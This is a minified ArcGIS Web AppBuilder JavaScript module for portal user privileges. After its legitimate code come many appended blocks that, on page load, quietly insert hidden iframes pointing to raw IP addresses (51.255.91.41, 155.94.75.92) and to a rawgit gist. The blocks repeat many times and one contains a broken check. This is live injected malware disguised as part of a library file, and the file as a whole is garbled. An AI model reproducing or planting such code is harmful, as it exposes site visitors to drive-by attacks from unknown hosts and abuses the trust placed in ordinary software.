// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/Deferred jimu/portalUtils jimu/portalUrlUtils jimu/Role esri/kernel ./PortalAnalysis".split(" "),function(h,c,k,g,l,m,n,p){var d=null,f=h([],{userRole:null,userPortalUrl:null,portalAnalysis:null,portalSelf:null,portalUrl:null,constructor:function(a){this.portalUrl=a},_clearLoadedInfo:function(){this.portalUrl=this.portalSelf=this.portalAnalysis=this.userPortalUrl=this.userRole=null},loadPrivileges:function(a){a&&this.portalUrl!==a&&(this._clearLoadedInfo(),
this.portalUrl=a);if(this._privilegeLoaded())return a=new k,a.resolve(!0),a;a=g.getPortal(this.portalUrl);return a.haveSignIn()?this._loadUserInfo(a):this._signIn(a)},_signIn:function(a){return a.loadSelfInfo().then(c.hitch(this,function(a){var e=g.getPortal(a.portalHostname);return null===e?!1:e.signIn().then(c.hitch(this,function(a){return this._loadUserInfo(e,a)}),function(){return!1})}),function(){return!1})},_registerOrgCredential:function(a,b){b=l.getStandardPortalUrl(b);a=c.clone(a.toJson());
b+="/sharing/rest";a.server=b;a.resources=[b];n.id.registerToken(a)},_loadUserInfo:function(a,b){return a.loadSelfInfo().then(c.hitch(this,function(a){this.userPortalUrl=a.urlKey?a.urlKey+"."+a.customBaseUrl:this.portalUrl;return a&&a.user?(this.userRole=new m({id:a.user.roleId?a.user.roleId:a.user.role,role:a.user.role}),a.user.privileges&&this.userRole.setPrivileges(a.user.privileges),this.portalSelf=a,b&&this._registerOrgCredential(b,this.userPortalUrl),this.portalAnalysis=new p(this.userRole,
this.portalSelf),!0):!1}),function(){return!1})},_privilegeLoaded:function(){return null!==this.portalSelf},getUser:function(){return this._privilegeLoaded()?this.portalSelf.user:null},isAdmin:function(){return this._privilegeLoaded()?this.userRole.isAdmin():!1},getUserPortal:function(){return this._privilegeLoaded()?this.userPortalUrl:null},isPortal:function(){return null!==this.portalSelf&&!0===this.portalSelf.isPortal},canPerformAnalysis:function(){return null!==this.portalAnalysis&&this.portalAnalysis.canPerformAnalysis()},
canPerformSpatialAnalytics:function(){return null!==this.portalAnalysis&&this.portalAnalysis.canPerformSpatialAnalytics()},canPerformGeoAnalytics:function(){return null!==this.portalAnalysis&&this.portalAnalysis.canPerformGeoAnalytics()},canPerformRasterAnalysis:function(){return null!==this.portalAnalysis&&this.portalAnalysis.canPerformRasterAnalysis()},canPerformGeoEnrichment:function(){return null!==this.portalAnalysis&&this.portalAnalysis._canPerformGeoEnrichment()},hasPrivileges:function(a){return null!==
this.portalAnalysis&&this.portalAnalysis.hasPrivileges(a)}});f.getInstance=function(a){null===d&&(d=new f(a));return d};return f});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});